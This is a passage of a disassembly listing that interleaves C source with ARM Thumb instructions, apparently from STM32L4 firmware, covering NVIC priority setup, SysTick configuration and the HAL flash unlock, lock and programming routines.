 80015ce:	401a      	ands	r2, r3
 80015d0:	697b      	ldr	r3, [r7, #20]
 80015d2:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 80015d4:	f04f 31ff 	mov.w	r1, #4294967295
 80015d8:	697b      	ldr	r3, [r7, #20]
 80015da:	fa01 f303 	lsl.w	r3, r1, r3
 80015de:	43d9      	mvns	r1, r3
 80015e0:	687b      	ldr	r3, [r7, #4]
 80015e2:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 80015e4:	4313      	orrs	r3, r2
         );
}
 80015e6:	4618      	mov	r0, r3
 80015e8:	3724      	adds	r7, #36	; 0x24
 80015ea:	46bd      	mov	sp, r7
 80015ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80015f0:	4770      	bx	lr
	...

080015f4 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 80015f4:	b580      	push	{r7, lr}
 80015f6:	b082      	sub	sp, #8
 80015f8:	af00      	add	r7, sp, #0
 80015fa:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 80015fc:	687b      	ldr	r3, [r7, #4]
 80015fe:	3b01      	subs	r3, #1
 8001600:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 8001604:	d301      	bcc.n	800160a <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 8001606:	2301      	movs	r3, #1
 8001608:	e00f      	b.n	800162a <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 800160a:	4a0a      	ldr	r2, [pc, #40]	; (8001634 <SysTick_Config+0x40>)
 800160c:	687b      	ldr	r3, [r7, #4]
 800160e:	3b01      	subs	r3, #1
 8001610:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 8001612:	210f      	movs	r1, #15
 8001614:	f04f 30ff 	mov.w	r0, #4294967295
 8001618:	f7ff ff8e 	bl	8001538 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 800161c:	4b05      	ldr	r3, [pc, #20]	; (8001634 <SysTick_Config+0x40>)
 800161e:	2200      	movs	r2, #0
 8001620:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 8001622:	4b04      	ldr	r3, [pc, #16]	; (8001634 <SysTick_Config+0x40>)
 8001624:	2207      	movs	r2, #7
 8001626:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 8001628:	2300      	movs	r3, #0
}
 800162a:	4618      	mov	r0, r3
 800162c:	3708      	adds	r7, #8
 800162e:	46bd      	mov	sp, r7
 8001630:	bd80      	pop	{r7, pc}
 8001632:	bf00      	nop
 8001634:	e000e010 	.word	0xe000e010

08001638 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001638:	b580      	push	{r7, lr}
 800163a:	b082      	sub	sp, #8
 800163c:	af00      	add	r7, sp, #0
 800163e:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001640:	6878      	ldr	r0, [r7, #4]
 8001642:	f7ff ff29 	bl	8001498 <__NVIC_SetPriorityGrouping>
}
 8001646:	bf00      	nop
 8001648:	3708      	adds	r7, #8
 800164a:	46bd      	mov	sp, r7
 800164c:	bd80      	pop	{r7, pc}

0800164e <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800164e:	b580      	push	{r7, lr}
 8001650:	b086      	sub	sp, #24
 8001652:	af00      	add	r7, sp, #0
 8001654:	4603      	mov	r3, r0
 8001656:	60b9      	str	r1, [r7, #8]
 8001658:	607a      	str	r2, [r7, #4]
 800165a:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 800165c:	2300      	movs	r3, #0
 800165e:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 8001660:	f7ff ff3e 	bl	80014e0 <__NVIC_GetPriorityGrouping>
 8001664:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 8001666:	687a      	ldr	r2, [r7, #4]
 8001668:	68b9      	ldr	r1, [r7, #8]
 800166a:	6978      	ldr	r0, [r7, #20]
 800166c:	f7ff ff8e 	bl	800158c <NVIC_EncodePriority>
 8001670:	4602      	mov	r2, r0
 8001672:	f997 300f 	ldrsb.w	r3, [r7, #15]
 8001676:	4611      	mov	r1, r2
 8001678:	4618      	mov	r0, r3
 800167a:	f7ff ff5d 	bl	8001538 <__NVIC_SetPriority>
}
 800167e:	bf00      	nop
 8001680:	3718      	adds	r7, #24
 8001682:	46bd      	mov	sp, r7
 8001684:	bd80      	pop	{r7, pc}

08001686 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001686:	b580      	push	{r7, lr}
 8001688:	b082      	sub	sp, #8
 800168a:	af00      	add	r7, sp, #0
 800168c:	4603      	mov	r3, r0
 800168e:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 8001690:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001694:	4618      	mov	r0, r3
 8001696:	f7ff ff31 	bl	80014fc <__NVIC_EnableIRQ>
}
 800169a:	bf00      	nop
 800169c:	3708      	adds	r7, #8
 800169e:	46bd      	mov	sp, r7
 80016a0:	bd80      	pop	{r7, pc}

080016a2 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 80016a2:	b580      	push	{r7, lr}
 80016a4:	b082      	sub	sp, #8
 80016a6:	af00      	add	r7, sp, #0
 80016a8:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 80016aa:	6878      	ldr	r0, [r7, #4]
 80016ac:	f7ff ffa2 	bl	80015f4 <SysTick_Config>
 80016b0:	4603      	mov	r3, r0
}
 80016b2:	4618      	mov	r0, r3
 80016b4:	3708      	adds	r7, #8
 80016b6:	46bd      	mov	sp, r7
 80016b8:	bd80      	pop	{r7, pc}
	...

080016bc <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 80016bc:	b580      	push	{r7, lr}
 80016be:	b086      	sub	sp, #24
 80016c0:	af00      	add	r7, sp, #0
 80016c2:	60f8      	str	r0, [r7, #12]
 80016c4:	60b9      	str	r1, [r7, #8]
 80016c6:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 80016ca:	2300      	movs	r3, #0
 80016cc:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 80016ce:	4b2f      	ldr	r3, [pc, #188]	; (800178c <HAL_FLASH_Program+0xd0>)
 80016d0:	781b      	ldrb	r3, [r3, #0]
 80016d2:	2b01      	cmp	r3, #1
 80016d4:	d101      	bne.n	80016da <HAL_FLASH_Program+0x1e>
 80016d6:	2302      	movs	r3, #2
 80016d8:	e053      	b.n	8001782 <HAL_FLASH_Program+0xc6>
 80016da:	4b2c      	ldr	r3, [pc, #176]	; (800178c <HAL_FLASH_Program+0xd0>)
 80016dc:	2201      	movs	r2, #1
 80016de:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016e0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016e4:	f000 f888 	bl	80017f8 <FLASH_WaitForLastOperation>
 80016e8:	4603      	mov	r3, r0
 80016ea:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 80016ec:	7dfb      	ldrb	r3, [r7, #23]
 80016ee:	2b00      	cmp	r3, #0
 80016f0:	d143      	bne.n	800177a <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80016f2:	4b26      	ldr	r3, [pc, #152]	; (800178c <HAL_FLASH_Program+0xd0>)
 80016f4:	2200      	movs	r2, #0
 80016f6:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80016f8:	4b25      	ldr	r3, [pc, #148]	; (8001790 <HAL_FLASH_Program+0xd4>)
 80016fa:	681b      	ldr	r3, [r3, #0]
 80016fc:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001700:	2b00      	cmp	r3, #0
 8001702:	d009      	beq.n	8001718 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001704:	4b22      	ldr	r3, [pc, #136]	; (8001790 <HAL_FLASH_Program+0xd4>)
 8001706:	681b      	ldr	r3, [r3, #0]
 8001708:	4a21      	ldr	r2, [pc, #132]	; (8001790 <HAL_FLASH_Program+0xd4>)
 800170a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800170e:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001710:	4b1e      	ldr	r3, [pc, #120]	; (800178c <HAL_FLASH_Program+0xd0>)
 8001712:	2202      	movs	r2, #2
 8001714:	771a      	strb	r2, [r3, #28]
 8001716:	e002      	b.n	800171e <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001718:	4b1c      	ldr	r3, [pc, #112]	; (800178c <HAL_FLASH_Program+0xd0>)
 800171a:	2200      	movs	r2, #0
 800171c:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 800171e:	68fb      	ldr	r3, [r7, #12]
 8001720:	2b00      	cmp	r3, #0
 8001722:	d107      	bne.n	8001734 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 8001724:	e9d7 2300 	ldrd	r2, r3, [r7]
 8001728:	68b8      	ldr	r0, [r7, #8]
 800172a:	f000 f8bd 	bl	80018a8 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 800172e:	2301      	movs	r3, #1
 8001730:	613b      	str	r3, [r7, #16]
 8001732:	e010      	b.n	8001756 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 8001734:	68fb      	ldr	r3, [r7, #12]
 8001736:	2b01      	cmp	r3, #1
 8001738:	d002      	beq.n	8001740 <HAL_FLASH_Program+0x84>
 800173a:	68fb      	ldr	r3, [r7, #12]
 800173c:	2b02      	cmp	r3, #2
 800173e:	d10a      	bne.n	8001756 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001740:	683b      	ldr	r3, [r7, #0]
 8001742:	4619      	mov	r1, r3
 8001744:	68b8      	ldr	r0, [r7, #8]
 8001746:	f000 f8d5 	bl	80018f4 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 800174a:	68fb      	ldr	r3, [r7, #12]
 800174c:	2b02      	cmp	r3, #2
 800174e:	d102      	bne.n	8001756 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001750:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 8001754:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001756:	f24c 3050 	movw	r0, #50000	; 0xc350
 800175a:	f000 f84d 	bl	80017f8 <FLASH_WaitForLastOperation>
 800175e:	4603      	mov	r3, r0
 8001760:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 8001762:	693b      	ldr	r3, [r7, #16]
 8001764:	2b00      	cmp	r3, #0
 8001766:	d006      	beq.n	8001776 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 8001768:	4b09      	ldr	r3, [pc, #36]	; (8001790 <HAL_FLASH_Program+0xd4>)
 800176a:	695a      	ldr	r2, [r3, #20]
 800176c:	693b      	ldr	r3, [r7, #16]
 800176e:	43db      	mvns	r3, r3
 8001770:	4907      	ldr	r1, [pc, #28]	; (8001790 <HAL_FLASH_Program+0xd4>)
 8001772:	4013      	ands	r3, r2
 8001774:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001776:	f000 f9cf 	bl	8001b18 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 800177a:	4b04      	ldr	r3, [pc, #16]	; (800178c <HAL_FLASH_Program+0xd0>)
 800177c:	2200      	movs	r2, #0
 800177e:	701a      	strb	r2, [r3, #0]

  return status;
 8001780:	7dfb      	ldrb	r3, [r7, #23]
}
 8001782:	4618      	mov	r0, r3
 8001784:	3718      	adds	r7, #24
 8001786:	46bd      	mov	sp, r7
 8001788:	bd80      	pop	{r7, pc}
 800178a:	bf00      	nop
 800178c:	2000000c 	.word	0x2000000c
 8001790:	40022000 	.word	0x40022000

08001794 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 8001794:	b480      	push	{r7}
 8001796:	b083      	sub	sp, #12
 8001798:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 800179a:	2300      	movs	r3, #0
 800179c:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800179e:	4b0b      	ldr	r3, [pc, #44]	; (80017cc <HAL_FLASH_Unlock+0x38>)
 80017a0:	695b      	ldr	r3, [r3, #20]
 80017a2:	2b00      	cmp	r3, #0
 80017a4:	da0b      	bge.n	80017be <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 80017a6:	4b09      	ldr	r3, [pc, #36]	; (80017cc <HAL_FLASH_Unlock+0x38>)
 80017a8:	4a09      	ldr	r2, [pc, #36]	; (80017d0 <HAL_FLASH_Unlock+0x3c>)
 80017aa:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 80017ac:	4b07      	ldr	r3, [pc, #28]	; (80017cc <HAL_FLASH_Unlock+0x38>)
 80017ae:	4a09      	ldr	r2, [pc, #36]	; (80017d4 <HAL_FLASH_Unlock+0x40>)
 80017b0:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80017b2:	4b06      	ldr	r3, [pc, #24]	; (80017cc <HAL_FLASH_Unlock+0x38>)
 80017b4:	695b      	ldr	r3, [r3, #20]
 80017b6:	2b00      	cmp	r3, #0
 80017b8:	da01      	bge.n	80017be <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 80017ba:	2301      	movs	r3, #1
 80017bc:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 80017be:	79fb      	ldrb	r3, [r7, #7]
}
 80017c0:	4618      	mov	r0, r3
 80017c2:	370c      	adds	r7, #12
 80017c4:	46bd      	mov	sp, r7
 80017c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017ca:	4770      	bx	lr
 80017cc:	40022000 	.word	0x40022000
 80017d0:	45670123 	.word	0x45670123
 80017d4:	cdef89ab 	.word	0xcdef89ab

080017d8 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 80017d8:	b480      	push	{r7}
 80017da:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 80017dc:	4b05      	ldr	r3, [pc, #20]	; (80017f4 <HAL_FLASH_Lock+0x1c>)
 80017de:	695b      	ldr	r3, [r3, #20]
 80017e0:	4a04      	ldr	r2, [pc, #16]	; (80017f4 <HAL_FLASH_Lock+0x1c>)
 80017e2:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 80017e6:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 80017e8:	2300      	movs	r3, #0
}
 80017ea:	4618      	mov	r0, r3
 80017ec:	46bd      	mov	sp, r7
 80017ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017f2:	4770      	bx	lr
 80017f4:	40022000 	.word	0x40022000

080017f8 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 80017f8:	b580      	push	{r7, lr}
 80017fa:	b084      	sub	sp, #16
 80017fc:	af00      	add	r7, sp, #0
 80017fe:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 8001800:	f7ff fe1a 	bl	8001438 <HAL_GetTick>
 8001804:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001806:	e00d      	b.n	8001824 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 8001808:	687b      	ldr	r3, [r7, #4]
 800180a:	f1b3 3fff 	cmp.w	r3, #4294967295
 800180e:	d009      	beq.n	8001824 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 8001810:	f7ff fe12 	bl	8001438 <HAL_GetTick>
 8001814:	4602      	mov	r2, r0
 8001816:	68fb      	ldr	r3, [r7, #12]
 8001818:	1ad3      	subs	r3, r2, r3
 800181a:	687a      	ldr	r2, [r7, #4]
 800181c:	429a      	cmp	r2, r3
 800181e:	d801      	bhi.n	8001824 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 8001820:	2303      	movs	r3, #3
 8001822:	e036      	b.n	8001892 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001824:	4b1d      	ldr	r3, [pc, #116]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 8001826:	691b      	ldr	r3, [r3, #16]
 8001828:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 800182c:	2b00      	cmp	r3, #0
 800182e:	d1eb      	bne.n	8001808 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 8001830:	4b1a      	ldr	r3, [pc, #104]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 8001832:	691a      	ldr	r2, [r3, #16]
 8001834:	4b1a      	ldr	r3, [pc, #104]	; (80018a0 <FLASH_WaitForLastOperation+0xa8>)
 8001836:	4013      	ands	r3, r2
 8001838:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 800183a:	68bb      	ldr	r3, [r7, #8]
 800183c:	2b00      	cmp	r3, #0
 800183e:	d01e      	beq.n	800187e <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001840:	4b18      	ldr	r3, [pc, #96]	; (80018a4 <FLASH_WaitForLastOperation+0xac>)
 8001842:	685a      	ldr	r2, [r3, #4]
 8001844:	68bb      	ldr	r3, [r7, #8]
 8001846:	4313      	orrs	r3, r2
 8001848:	4a16      	ldr	r2, [pc, #88]	; (80018a4 <FLASH_WaitForLastOperation+0xac>)
 800184a:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 800184c:	68bb      	ldr	r3, [r7, #8]
 800184e:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001852:	2b00      	cmp	r3, #0
 8001854:	d007      	beq.n	8001866 <FLASH_WaitForLastOperation+0x6e>
 8001856:	4b11      	ldr	r3, [pc, #68]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 8001858:	699a      	ldr	r2, [r3, #24]
 800185a:	68bb      	ldr	r3, [r7, #8]
 800185c:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001860:	490e      	ldr	r1, [pc, #56]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 8001862:	4313      	orrs	r3, r2
 8001864:	618b      	str	r3, [r1, #24]
 8001866:	68bb      	ldr	r3, [r7, #8]
 8001868:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 800186c:	2b00      	cmp	r3, #0
 800186e:	d004      	beq.n	800187a <FLASH_WaitForLastOperation+0x82>
 8001870:	4a0a      	ldr	r2, [pc, #40]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 8001872:	68bb      	ldr	r3, [r7, #8]
 8001874:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001878:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 800187a:	2301      	movs	r3, #1
 800187c:	e009      	b.n	8001892 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 800187e:	4b07      	ldr	r3, [pc, #28]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 8001880:	691b      	ldr	r3, [r3, #16]
 8001882:	f003 0301 	and.w	r3, r3, #1
 8001886:	2b00      	cmp	r3, #0
 8001888:	d002      	beq.n	8001890 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 800188a:	4b04      	ldr	r3, [pc, #16]	; (800189c <FLASH_WaitForLastOperation+0xa4>)
 800188c:	2201      	movs	r2, #1
 800188e:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 8001890:	2300      	movs	r3, #0
}
 8001892:	4618      	mov	r0, r3
 8001894:	3710      	adds	r7, #16
 8001896:	46bd      	mov	sp, r7
 8001898:	bd80      	pop	{r7, pc}
 800189a:	bf00      	nop
 800189c:	40022000 	.word	0x40022000
 80018a0:	0002c3fa 	.word	0x0002c3fa
 80018a4:	2000000c 	.word	0x2000000c

080018a8 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 80018a8:	b480      	push	{r7}
 80018aa:	b085      	sub	sp, #20
 80018ac:	af00      	add	r7, sp, #0
 80018ae:	60f8      	str	r0, [r7, #12]
 80018b0:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 80018b4:	4b0e      	ldr	r3, [pc, #56]	; (80018f0 <FLASH_Program_DoubleWord+0x48>)
 80018b6:	695b      	ldr	r3, [r3, #20]
 80018b8:	4a0d      	ldr	r2, [pc, #52]	; (80018f0 <FLASH_Program_DoubleWord+0x48>)
 80018ba:	f043 0301 	orr.w	r3, r3, #1
 80018be:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 80018c0:	68fb      	ldr	r3, [r7, #12]
 80018c2:	683a      	ldr	r2, [r7, #0]
 80018c4:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 80018c6:	f3bf 8f6f 	isb	sy
}
 80018ca:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 80018cc:	e9d7 0100 	ldrd	r0, r1, [r7]
 80018d0:	f04f 0200 	mov.w	r2, #0
 80018d4:	f04f 0300 	mov.w	r3, #0
 80018d8:	000a      	movs	r2, r1
 80018da:	2300      	movs	r3, #0
 80018dc:	68f9      	ldr	r1, [r7, #12]
 80018de:	3104      	adds	r1, #4
 80018e0:	4613      	mov	r3, r2
 80018e2:	600b      	str	r3, [r1, #0]
}
 80018e4:	bf00      	nop
 80018e6:	3714      	adds	r7, #20
 80018e8:	46bd      	mov	sp, r7
 80018ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018ee:	4770      	bx	lr
 80018f0:	40022000 	.word	0x40022000

080018f4 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 80018f4:	b480      	push	{r7}
 80018f6:	b089      	sub	sp, #36	; 0x24
 80018f8:	af00      	add	r7, sp, #0
 80018fa:	6078      	str	r0, [r7, #4]
 80018fc:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 80018fe:	2340      	movs	r3, #64	; 0x40
 8001900:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 8001902:	687b      	ldr	r3, [r7, #4]
 8001904:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 8001906:	683b      	ldr	r3, [r7, #0]
 8001908:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 800190a:	4b14      	ldr	r3, [pc, #80]	; (800195c <FLASH_Program_Fast+0x68>)
 800190c:	695b      	ldr	r3, [r3, #20]
 800190e:	4a13      	ldr	r2, [pc, #76]	; (800195c <FLASH_Program_Fast+0x68>)
 8001910:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001914:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 8001916:	f3ef 8310 	mrs	r3, PRIMASK
 800191a:	60fb      	str	r3, [r7, #12]
  return(result);
 800191c:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 800191e:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 8001920:	b672      	cpsid	i
}
 8001922:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 8001924:	697b      	ldr	r3, [r7, #20]
 8001926:	681a      	ldr	r2, [r3, #0]
 8001928:	69bb      	ldr	r3, [r7, #24]
 800192a:	601a      	str	r2, [r3, #0]
    dest_addr++;
 800192c:	69bb      	ldr	r3, [r7, #24]
 800192e:	3304      	adds	r3, #4
 8001930:	61bb      	str	r3, [r7, #24]
    src_addr++;
 8001932:	697b      	ldr	r3, [r7, #20]
 8001934:	3304      	adds	r3, #4
 8001936:	617b      	str	r3, [r7, #20]
    row_index--;
 8001938:	7ffb      	ldrb	r3, [r7, #31]
